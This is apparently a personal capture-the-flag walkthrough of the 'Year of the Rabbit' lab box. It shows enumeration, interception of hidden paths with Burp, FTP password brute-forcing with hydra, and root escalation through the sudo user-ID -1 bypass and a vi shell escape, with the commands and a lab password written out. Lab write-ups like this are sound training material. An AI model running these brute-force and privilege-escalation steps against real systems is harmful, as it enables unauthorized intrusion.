First we do an nmap scan
	sudo nmap -p- -vvv -sC -sV -Pn -A -O 10.10.174.245
	we can see that it is a regular linux apache web server
	we also see both ftp and ssh are open
		lets see if we can do an anonymous login
		we cannot with ftp
While the NMAP scan is still running lets use a directory buster and see if there is anything else we can find
	gobuster dir -u http://10.10.174.245 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
we can see that we have an assets
	going there we see rick rolled and style
	Rick rolled is just what you think it is
	the styles.css when opened looks like nothing
	checking the metadata with inspect element shows us some stuff
/* Nice to see someone checking the stylesheets. Take a look at the page: /sup3r_s3cr3t_fl4g.php
	Going to that page we see word of advice, turn off your javascript
		To do this follow the directions below:
How to Turn Off JavaScript in Firefox

    Enter about:config into the URL bar in Firefox.
    Select the blue Accept the Risk and Continue button.
    Enter javascript. enabled into the search box at the top of the page. ...
    Select the toggle to the right of javascript. ...
    JavaScript is now disabled in your Firefox browser.
After turning off Javascript we see the following
	Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
	I couldn't hear anything even with audio turned all the way up
	Lets do a burpsuite and see if we see anything in there that could be useful
So after playing around a little bit I noticed that we had to turn javascript back on, then use go to the site with the secret flag.php address
From here burpsuite will then intercept the packets with a proxy on in firefox, then we need to forward the packets. 
We see GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
	That means there is another hidden directory, just like the first time
Incase your wondering, yes I already tried to use metasploit with the vsftpd, it is not the right version
Now turn off your proxy and put in the the website, 10.10.174.245/WExYY2Cv-qU
	Now we see hotbabe file
		wget http://10.10.88.119/WExYY2Cv-qU/Hot_Babe.png (IP address changed, had to put son down for a nap)
		Since it is a png file we cannot do a stegcracker on it
	Something told me to do a cat on the file and see if we can just read it
	Sure enough there was some stuff in there, and it says one of these are the ftp passwords
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
	Copy those passwords and put them in a file
	To make sure they all stay in order, use vim
		vim ftp.txt
		ctrl+shift v
		:wq
		cat ftp.txt
	Everything looks good!
Now lets use hydra to try and get in through ftp
	hydra -l ftpuser -P Desktop/year.txt ftp://10.10.88.119
WE GOT A HIT
	Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Lets login and see what we can find
	we see Eli's txt and that is it
	get Eli's_Creds.txt
	exit out of ftp
and now... we have what is called a brainfuck, no literally that is what the programming language is called..
	You can actually decode this programming language, here you go
		https://www.dcode.fr/brainfuck-language
	Now that we have copied it into the site and decoded it we can use that password, only one thing left ssh
kali@kali:~$ ssh -l eli 10.10.88.119
eli@10.10.88.119's password: 



1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

Now we have someone named Gwendoline...
	If we look through the different directories and look through the home directory we can see a Gwendoline folder
	That then shows us a user.txt but we cannot open it
	sudo -l shows that eli is useless to this orgnization...
the leet was really throwing me off and i couldn't figure out why, I then searched leet on google and realized it is elite for gaming, lets look at the game folder
If we go into cd /usr/games we can see there is another folder called s3cr3t
Opening the folder we then find the following
	.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
We then find this 60 CHARACTERS LONG LOL
	Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root

su gwendoline
	MniVCQVhQHUNI
we can now look at the user.txt file, making life much easier, and hopefully the root.txt file also
We cannot do root.txt yet but if we do a sudo -l we do get the following
	
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
What is weird is that it looks like we can use vim for the user.txt file, lets try to do that with sudo 
       sudo u#-1 /usr/bin/vi /home/gwendoline/user.txt
We can see that it is a readonly file
	use the ! to be able to write
	!whoami
	and all of sudden root comes up, that is pretty cool
:!/bin/bash
	Then when you hit enter you automatically kicked, but we are root!
cat root/root.txt
That one was pretty fun and really cool to see what something happeing in Vim, first time for me to see that!
